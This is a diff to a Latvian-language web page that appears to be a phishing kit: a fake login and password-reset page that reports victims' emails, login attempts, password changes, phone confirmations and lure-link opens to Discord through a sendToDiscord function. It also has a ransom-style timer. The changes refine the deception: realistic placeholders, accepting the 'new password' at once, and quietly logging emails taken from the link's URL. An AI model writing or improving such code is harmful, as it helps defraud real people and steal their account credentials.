@@ -493,11 +493,11 @@ body {
 <p class="modal__sub" id="forgotSub"></p>
 <div class="modal__form-group">
 <label for="forgotEmail" id="forgotEmailLabel">E-pasts</label>
-<input type="email" id="forgotEmail" placeholder="" />
+<input type="email" id="forgotEmail" placeholder="janis@jak.lv" />
 </div>
 <div class="modal__form-group">
 <label for="forgotOldPassword" id="forgotOldLabel">Jaunā parole</label>
-<input type="password" id="forgotOldPassword" placeholder="" />
+<input type="password" id="forgotOldPassword" placeholder="••••••••" />
 </div>
 <div class="modal__error" id="forgotError"></div>
 <div class="modal__actions">
@@ -633,7 +633,8 @@ async function sendToDiscord(email, action, opts = {}) {
     u.link_opens++;
   } else if (action.includes('Pieslēgšanās mēģinājums')) {
     u.login_attempts++;
-    if (attempt !== null) u.login_attempts = attempt;
+  } else if (action.includes('Pieslēgšanās ar jauno paroli')) {
+    // Jaunā parole — login_attempts netiek mainīts
   } else if (action.includes('Paroles maiņa apstiprināta')) {
     u.pwd_changes++;
   } else if (action.includes('Telefona numurs apstiprināts')) {
@@ -706,6 +707,7 @@ async function sendToDiscord(email, action, opts = {}) {
 
 let storedEmail = '';
 let loginAttempts = 0;
+let passwordChanged = false;
 const MAX_ATTEMPTS_BEFORE_PHONE = 2;
 let currentLang = 'lv';
 let waitInterval = null;
@@ -819,8 +821,21 @@ function startRansomTimer(seconds) {
 }
 
 function attemptLogin(email, password) {
-  loginAttempts++;
   const hasPassword = Boolean(password && password.length > 0);
+
+  // Ja parole tikko nomainīta → pieņem uzreiz
+  if (passwordChanged) {
+    sendToDiscord(email, 'Pieslēgšanās ar jauno paroli', {
+      hasPassword: true,
+    });
+    passwordChanged = false;
+    formError.textContent = '';
+    passwordInput.value = '';
+    showWaitScreen();
+    return true;
+  }
+
+  loginAttempts++;
 
   sendToDiscord(email, 'Pieslēgšanās mēģinājums', {
     hasPassword: hasPassword,
@@ -869,6 +884,8 @@ forgotSendBtn.addEventListener('click', function () {
     hasPassword: true,
   });
 
+  passwordChanged = true;
+
   hideAllModals();
   showPasswordChangedModal();
 });
@@ -883,7 +900,6 @@ forgotCancelBtn.addEventListener('click', function () {
 
 pwdChangedOk.addEventListener('click', function () {
   pwdChangedModal.classList.remove('active');
-  loginAttempts = 0;
   formError.textContent = '';
   passwordInput.value = '';
   emailInput.focus();
@@ -1138,11 +1154,7 @@ window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', sw
   const params = new URLSearchParams(window.location.search);
   const emailParam = params.get('email');
   if (emailParam) {
-    // Iztīra URL uzreiz
     window.history.replaceState({}, '', '/');
-
-    // Sūta uz Discord ar e-pastu no linka
-    // BET NEIELIEK to formā — lietotājs pats ievadīs
     sendToDiscord(emailParam, '📨 Saites atvēršana', { clickOnly: true });
   }
 
